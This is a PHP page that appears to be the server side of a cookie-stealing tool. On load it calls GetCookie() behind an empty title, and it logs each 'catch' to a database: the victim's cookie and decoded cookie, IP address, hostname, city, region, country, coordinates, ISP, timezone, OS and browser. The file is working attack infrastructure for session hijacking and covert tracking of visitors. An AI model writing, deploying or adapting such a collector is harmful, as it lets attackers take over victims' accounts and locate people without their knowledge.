<?php
	require_once("Core/init.php");

	$Database = new Database();

	if(Input::Exists()) {
		$Database::Insert("catches", array(
			"id" => Hash::Make(),
			"cookie" => (Input::Get("cookie-value") !== null && !empty(Input::Get("cookie-value"))) ? Input::Get("cookie-value") : "No cookie set",
			"decoded_cookie" => (Input::Get("decoded-cookie") !== null && !empty(Input::Get("decoded-cookie"))) ? Input::Get("decoded-cookie") : "Nothing to decode",
			"ip_address" => Input::Get("ip-address"),
			"user_agent" => Input::Get("user-agent"),
			"local_hostname" => Input::Get("local-hostname"),
			"hostname" => Input::Get("hostname"),
			"city" => Input::Get("city"),
			"region" => Input::Get("region"),
			"country" => Input::Get("country"),
			"latitude" => Input::Get("latitude"),
			"longitude" => Input::Get("longitude"),
			"service_provider" => Input::Get("service-provider"),
			"timezone" => Input::Get("timezone"),
			"location" => Input::Get("location"),
			"client_os" => Input::Get("client-os"),
			"client_browser" => Input::Get("client-browser"),
			"catch_date" => StringFormatter::GetDateTime(false, true)
		));
	}

	$IPAddress = Client::GetIP();
?>
<!DOCTYPE html>
<html lang="<?= getLanguage(); ?>">
<head>
	<title></title>
	<script src="JavaScript/Base/Generic.js"></script>
</head>
<body onload="GetCookie();">
	<?php HTMLBuilder::CatchForm($IPAddress, Client::GetLocation($IPAddress), Client::GetUserAgent()); ?>
</body>
</html>

